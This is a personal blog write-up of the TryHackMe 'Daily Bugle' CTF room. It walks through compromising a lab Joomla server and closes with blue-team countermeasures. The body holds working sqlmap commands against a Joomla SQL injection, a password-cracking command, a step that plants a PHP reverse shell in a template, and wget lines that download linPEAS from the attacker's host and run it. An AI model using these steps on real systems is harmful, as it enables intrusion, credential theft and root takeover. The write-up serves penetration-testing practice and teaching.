---
title: "TryHackMe Writeup: Daily Bugle"
description: "About hacking an old Joomla site to grab a shell; Guest: old but good SQL injection"
date: 2021-11-20T08:13:30+02:00
draft: false
tags: ["security", "TryHackMe"]
categories: ["Writeup", "THM"]
---

Security is one of my side passion on computer engineering, and if you also like security, [Try Hack Me](https://tryhackme.com/) is a nice place to keep under your radar. This morning I had some fun with [Daily Bugle machine](https://tryhackme.com/room/dailybugle) so I decided to publish my raw writeup.

## Scan the machine

A standard NMap reveals ssh and port 80 opened hosting a nice joomla web site. If you do not want to be especially stealthy, you can let nmap test for vulnerability with standard script, nothing special.

{{< highlight bash "linenos=table" >}}
nmap -sV -sC 10.10.1.68 --script=vuln -oA nmapvuln  
{{< / highlight >}}

This will produce a nice output that contains everything you need to know to proceed in hacking this machine.

![Joomla version](../images/joomla-version.png)

***Figure 1***: *Joomla version*

And the first question is answered, we have **version of joomla kindly reported by nmap**. But if you dig down nmap output, you can find that that version has a well known vulnerability.

![Vulnerability](../images/joomla-vulnerability.png)

***Figure 2***: *Joomla vulnerability*

## exploit CVE with SqlMap

From CVE it is simple to browse in [Exploit Db](https://www.exploit-db.com/exploits/42033) for a nice explanation on how to exploit it. You can find directly **nmap command line to exploit the site**

![Sql Map](../images/sql-map-joomla-exploit.png)

***Figure 3***: *Sql map vulnerability*

If you look in Figure 3 you will **see that the author of the exploit suggests level=5**, but running with that level of details can really takes a long long time, so I've decided to try removing the level=5 and leave only a risk level of 3. I do not know if it is going to work, but **I want to save some time**

![Sql Map at work](../images/sql-map-at-work-joomla.png)

***Figure 3***: *Sql Map at work*

Just leave it to works, depending on speed of the server it will take some time **to produce a result, but eventually it finally was able to understand how to use the vulnerability**. Once NMap understand how to exploit the url, I can list all the tables of the joomla database

{{< highlight bash "linenos=table" >}}
sqlmap -u "http://xxx.xxx.xxx.xxx/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --dbms=MySQL -D joomla --tables 
{{< / highlight >}}

And I can confirm that it is a joomla database that seems to have an **interesting table called #__users**

![Joomla tables](../images/joomla-tables.png)

***Figure 4***: *Joomla tables*

It is worth dumping everything **from the #__users tables because we expect to find some information and hashed password for users**.

{{< highlight bash "linenos=table" >}}
sqlmap -u "http://xxx.xxx.xxx.xxx/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --dbms=MySQL -D joomla -T "#__users" --dump
{{< / highlight >}}

How annoying, for some reason this vulnerability does not allows SqlMap to dump table columns, **we can let it try to enum all common table columns automatically**, but in a real scenario usually you will install the same version of joomla locally so you can inspect a standard database locally. **I did  not check if with level=5 Sqlmap would be able to find a better way to exploit the vulnerability. For now I'm continuing to check if I have everything I need.**

![No column enumeration](../images/no-column-enumeration-joomla.png)

***Figure 5***: *No column enumeration*

I answered Yes for automatic enumeration and I choose Sqlmap default list of columns and I let him go. After a while I can already see some **juicy columns**

![Interesting column as enumeration result](../images/joomla-column-enumeration.png)

***Figure 6***: *No column enumeration*

Now I can stop column enumeration, because I can immediately dump users, **sqlmap has a nice --sql-query parameter that allows me to issue a super simple query to the database**, this makes trivial to select stuff from database.

{{< highlight bash "linenos=table" >}}
sqlmap -u "http://10.10.45.162/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" --sql-query="select username,password from #__users"
{{< / highlight >}}

From the output I discovered that the #__users table has a single user (99.99% probability is the only admin) with **hashed password**.

![User and password](../images/user-and-password-hash.png)

***Figure 7***: *User and password*

## Cracking the password and get the user flag

Since this is a CTF, you can indeed suppose that the password is contained in the famous rockyou.txt password list, time to fire John the ripper, **save raw password hash into a file called hash, then try to crack with john**.

{{< highlight bash "linenos=table" >}}
john --wordlist=/usr/share/wordlists/rockyou.txt hash
{{< / highlight >}}

Now wait for few minutes, depending on the power of your machine, password is in bcrypt format and you need a little bit of time to decrypt. Once you found the password you realize **that probably you could have also guessed it from the context of the CTF :D :D** because it is super obvious. As soon as I have the password I tried to use those credentials into SSH, but they are incorrect.

Since that user is the only one you found in joomla it is probably the administrator, after **a little google search you can find that /administrator is the page that joomla uses for administration**, so I'm supposed to exploit joomla to finish this machine.

Now it is time to grab a shell, after you login as administrator **next step is trying to have your site to execute a reverse tcp shell** and since joomla is a CMS and **I have administrator password** the solution is super simple, templates. Just go to the template section and verify that you can edit templates.

![Joomla templates](../images/template-joomla.png)

***Figure 8***: *Joomla templates*

In cms like joomla or in wordpress, **a template is a complete php page that renders content**, so if you are an administrator you can simply directly edit index.php (1) and add all php code you need (2), just grab any php reverse tcp_ip shell and paste into index.php then start netcat on your side, finally press Template Preview to preview your modifications and you got a shell.

![Joomla template editor let you add arbitrary php code to index.php page](../images/editing-template-shell.png)

***Figure 9***: *Joomla template editor let you add arbitrary php code to index.php page*

![Just add a shell to index.php](../images/shell-joomla.png)

***Figure 10***: *Just add a shell to index.php*

Now you have a shell that runs with web server privilege (apache user) so you cannot read standard user folder, but from here on it is **standard CTF way to escalate from web user to standard user**. Download linPEAS from the internet, use python3 -m http.server 80 to start a local webserver and use wget from your shell to download and execute linPEAS.

The only caveat is that you should specify a different directory to wget because the **apache user has no right to write in current directory**.

{{< highlight bash "linenos=table" >}}
wget http://10.11.51.136/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
{{< / highlight >}}

Examining the output of linpeas you can **search for common keywords** but one information stands out, there is a database password. 

![Password found by linPEAS](../images/password-found-by-linpeas.png)

***Figure 11***: *Password found by linPEAS*

If we are lucky enough this is a password of a user, since this is not a hard CTF, it worth a try logging through ssh with one of the user. **Just listing /home folder reveals that we have a single user called jjameson.** 

Bingo, **logging in SSH with user jjameson and the password found by linPEAS** allows me to login and grab the user flag.

## From user to root

Almost too simple, once I'm in as jjameson user issuing a sudo -l reveals **that the user is allowed to use yum command with sudo**. Checking [GTFOBins](https://gtfobins.github.io/gtfobins/yum/) immediately reveals that it is vulnerable.

![sudo -l, an old friend](../images/sudo-l-jjameson.png)

***Figure 12***: *sudo -l, an old friend*

And in GTFObin there is a simple script to run to simply got root, almost trivial.

![GTFObin for yum](../images/full-yum-script.png)

***Figure 13***: *GTFObin for yum*

I can really just copy the script from GTFOBin and **directly paste in ssh shell to become root**.

![And now I'm root](../images/yum-gtfobin-root.png)

***Figure 14***: *And now I'm root*

## Conclusion and countermeasures

Daily bugle is a nice machine, quite easy even for people like me that are not soo deep in **penetration test field**. Everything you need was pretty much contained in lessons you can find in Try Hack Me or in any other introductory courses on penetration testing. Nevertheless **it was fun because it gave you the ability to try some basic techniques to hack into a machine and understand what you should never do in real life**.

At the end of a CTF it is nice to try to understand what the machine taught from a blue team perspective. 

### Update your software

Always keep you software up to date, that joomla version was old and buggy and it is **really scary to see how simple is to just copy a script from the internet and run into SQLMap to have full control on the database**.

### Please use strong password

We were able to crack joomla password with easy because **the password was super trivial**. Nevertheless we could have tried to add other users into database using SQLMap to execute an INSERT instead of only reading data.

At least the user did not use the very same password for the site and for SSH.

### Password in clear text, oh no!!

Another really common error is leaving password inside configuration files where everyone can read it, and **if you use the same password as your linux login, you are really in trouble.**. Again and again, never reuse the very same password in multiple services, and never use your account password in some configuration file.

Gian Maria.









